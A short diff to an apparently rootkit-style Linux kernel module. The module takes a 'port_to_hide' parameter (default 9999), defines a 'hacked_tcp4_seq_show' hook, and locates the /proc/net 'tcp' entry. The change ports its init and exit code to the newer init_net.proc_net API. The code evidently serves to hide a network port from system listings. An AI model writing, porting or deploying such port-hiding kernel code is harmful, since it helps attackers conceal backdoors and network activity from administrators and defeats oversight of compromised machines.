@@ -9,6 +9,7 @@
 
 //#define PORT_TO_HIDE 9999
 
+
 static char* port_to_hide = "9999";
 module_param(port_to_hide, charp, S_IRUGO);
 
@@ -43,7 +44,7 @@ int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
 static int __init myinit(void)
 {
         struct tcp_seq_afinfo *my_afinfo = NULL;
-        struct proc_dir_entry *my_dir_entry = proc_net->subdir;
+        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
 
         while (strcmp(my_dir_entry->name, "tcp"))
                 my_dir_entry = my_dir_entry->next;
@@ -59,7 +60,7 @@ static int __init myinit(void)
 static void myexit(void)
 {
         struct tcp_seq_afinfo *my_afinfo = NULL;
-        struct proc_dir_entry *my_dir_entry = proc_net->subdir;
+        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
 			 
         while (strcmp(my_dir_entry->name, "tcp"))
                 my_dir_entry = my_dir_entry->next;
